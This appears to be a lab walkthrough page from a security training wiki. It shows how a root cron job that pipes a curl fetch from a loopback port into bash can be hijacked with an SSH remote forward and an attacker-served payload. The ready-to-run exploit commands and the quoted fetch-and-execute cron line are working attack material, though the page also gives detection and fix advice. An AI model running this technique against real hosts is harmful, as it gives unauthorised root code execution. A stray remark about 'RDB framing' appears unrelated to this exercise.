# C07 · Station B — remote forward (-R) → root updater · ★★★☆

> **Chapter:** [[Chapter-07-Overview]] · **Next:** [[Chapter-08-Overview]]
> **Host:** `hollow-relay-01` (`target-pivot`) · **Service:** a root cron fetching `http://127.0.0.1:9000/payload.sh`
> **The bug:** a root job pulls code from a loopback port and pipes it to a shell.

---

## 1. Exploit — do this first

```bash
# attacker: serve the payload
mkdir web && printf 'cp /root/flag.txt /tmp/flag; chmod 644 /tmp/flag\n' > web/payload.sh
( cd web && python3 -m http.server 8000 & )
# attacker: publish it onto the target's 127.0.0.1:9000
ssh -f -N -R 9000:127.0.0.1:8000 labuser1@target-pivot
# wait <=60s, then:
ssh labuser1@target-pivot cat /tmp/flag
```

---

## 2. How you find it

```bash
cat /etc/cron.d/rtr-updater
# * * * * * root curl -fs http://127.0.0.1:9000/payload.sh | bash
```
Nothing listens on `:9000` — so become that service.

## 3. Why it works

`-R 9000:127.0.0.1:8000` tells the target's sshd to listen on its own
`127.0.0.1:9000` and forward back through the session to your `127.0.0.1:8000`.
When root's cron curls `http://127.0.0.1:9000/payload.sh`, it reaches **your**
web server, downloads your script, and runs it as root. `-R` binds the target's
loopback by default — exactly where the updater looks.

## 4. Pitfalls

- **Why `-R` and not another `-L`?** Station A pulled a service *to* you. This
  bug is the target reaching *out* to its own loopback — you can't satisfy it by
  connecting in, so you publish your listener onto the target with `-R`.
  Recognising which direction a situation needs is the whole skill.
- Keep the HTTP server and the `-R` tunnel both up until the tick fires.

## 5. Detect & fix

- **Detect:** unexpected loopback listeners from an sshd child; a root job piping a network fetch to a shell.
- **Fix:** never `curl … | bash`; authenticate even loopback services; `AllowTcpForwarding no` where unneeded. [[Blue-Team-Playbook]].

## 6. What you learned

- `-R` is the mirror of `-L`: push your service onto the target's loopback.
- Not every sink tolerates RDB framing — pick the primitive that fits.

> Next chapter: [[Chapter-08-Overview]] · Related: [[C07-Station-A-local-forward-webapp]]
